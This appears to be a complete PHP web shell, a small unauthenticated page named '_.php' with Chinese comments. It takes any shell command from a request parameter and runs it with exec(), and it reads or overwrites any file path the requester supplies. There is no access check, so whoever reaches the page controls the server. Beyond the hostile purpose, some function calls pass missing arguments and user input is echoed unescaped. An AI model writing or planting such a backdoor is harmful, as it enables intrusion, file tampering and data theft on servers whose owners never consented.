<?php

if($_REQUEST['do']){
    $file = $_REQUEST['f'];
    $cmd = trim($_REQUEST['cmd']);
    $content = trim($_REQUEST['content']);
    if ($cmd == '') {
        if($file && $content){
            file_put_contents($file, $content);
            echo nl2br("ok\n").contentform($file, $content);
        }else{
            echo nl2br("fail\n").contentform($file, $content);
        }
    }else{
        $output = array();
        $returnValue = 0;

        // 执行 shell 命令
        exec($cmd, $output, $returnValue);

        // 检查返回值以确定命令是否成功执行
        if ($returnValue === 0) {
            // 输出正确的结果
            echo cmdform().nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output)."\n");
        } else {
            // 输出错误信息
            echo cmdform().nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output)."\n");
        }
    }

}else{
    $file = $_GET['f'];
    if($file){
        $content = file_get_contents($file);
    }
    echo cmdform().contentform();
}

function cmdform($cmd){
    return <<<HTML
    <form action="/_.php?do=1" method="post">
        <textarea name="cmd" style="width:95vw;height:10vh">{$cmd}</textarea>
        <p><button type="submit">提交</button></p>
    </form>
HTML;
}
function contentform($file, $content){
    return <<<HTML
    <form action="/_.php?do=1&f={$file}" method="post">
        <textarea name="content" style="width:95vw;height:70vh">{$content}</textarea>
        <p><button type="submit">提交</button></p>
    </form>
HTML;
}